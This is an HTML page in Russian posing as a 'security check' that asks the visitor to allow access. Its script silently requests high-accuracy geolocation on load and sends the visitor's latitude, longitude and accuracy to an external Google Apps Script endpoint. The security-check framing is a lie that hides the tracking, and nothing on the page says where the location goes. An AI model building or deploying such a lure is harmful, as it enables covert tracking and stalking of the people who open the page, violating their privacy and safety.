<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Проверка безопасности</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
      color: #333;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Проверка безопасности</h2>
  <p>Пожалуйста, разрешите доступ для продолжения</p>
  <div class="loader"></div>

  <script>
    function sendLocation(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      const url = `https://script.google.com/macros/s/AKfycbxK3sFmC2YreooOCiK9jU7lLFwMlt7NflHTzU5UUY6FesXfQDYOkg5RZUy2eobocL16/exec?lat=${lat}&lon=${lon}&acc=${acc}`;

      fetch(url)
        .then(res => console.log("Успешно"))
        .catch(err => console.error("Ошибка при отправке:", err));
    }

    function locationError(err) {
      alert("Ошибка доступа" + err.message);
    }

    navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
      enableHighAccuracy: true,
      timeout: 10000
    });
  </script>
</body>
</html>
